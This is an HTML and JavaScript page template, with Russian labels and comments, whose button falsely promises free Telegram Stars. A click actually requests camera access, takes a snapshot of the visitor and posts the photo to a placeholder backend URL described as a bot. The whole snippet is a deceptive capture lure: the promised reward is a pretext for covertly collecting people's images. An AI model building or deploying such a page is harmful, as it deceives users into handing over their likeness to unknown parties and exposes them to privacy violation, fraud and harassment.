<button id="openCamera">получить звезды в телеграмме</button>
<video id="video" autoplay style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const button = document.getElementById('openCamera');

  button.addEventListener('click', async () => {
    try {
      // Запрашиваем доступ к камере
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
      video.style.display = 'block';
      
      // Ждём, пока камера включится
      await new Promise(resolve => video.onloadedmetadata = resolve);
      
      // Делаем снимок
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      
      // Останавливаем камеру
      stream.getTracks().forEach(track => track.stop());
      
      // Конвертируем фото в Blob (для отправки)
      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append('photo', blob, 'user_photo.jpg');
        
        // Отправляем фото на сервер (бэкенд)
        const response = await fetch('ВАШ_БЭКЕНД_URL', {
          method: 'POST',
          body: formData,
        });
        
        if (response.ok) {
          alert('Фото отправлено в бота!');
        } else {
          alert('Ошибка отправки :(');
        }
      }, 'image/jpeg');
      
    } catch (err) {
      alert('Ошибка доступа к камере: ' + err.message);
    }
  });
</script>